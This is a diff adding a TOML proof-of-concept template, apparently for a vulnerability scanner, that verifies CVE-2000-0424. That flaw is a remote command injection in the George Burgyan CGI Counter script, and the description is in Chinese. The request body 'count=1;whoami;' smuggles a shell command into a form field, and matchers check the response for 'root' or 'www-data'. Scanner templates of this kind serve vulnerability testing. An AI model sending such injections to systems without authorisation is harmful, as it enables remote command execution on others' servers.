@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "CVE-2000-0424 漏洞影响 George Burgyan CGI Counter 4.0.2/4.0.7 版本，该版本存在 CGI 输入验证漏洞。攻击者可通过向 CGI 程序提交包含 shell 元字符的特制 HTTP 请求来触发漏洞，实现远程命令执行。验证时需识别目标 CVE 实例并构造恶意参数。无需身份认证即可远程利用。"
+id = "POC-AVE-2000-0345"
+name = "George Burgyan CGI Counter RCE 漏洞验证"
+severity = "high"
+tags = ["ave-2000-0345"]
+vuln_id = [
+    "CVE-2000-0424",
+    "AVE-2000-0345",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/counter.cgi"
+protocol = "http"
+status = [200]
+
+[poc.requests.body]
+content = "count=1;whoami;"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root",
+    "www-data",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
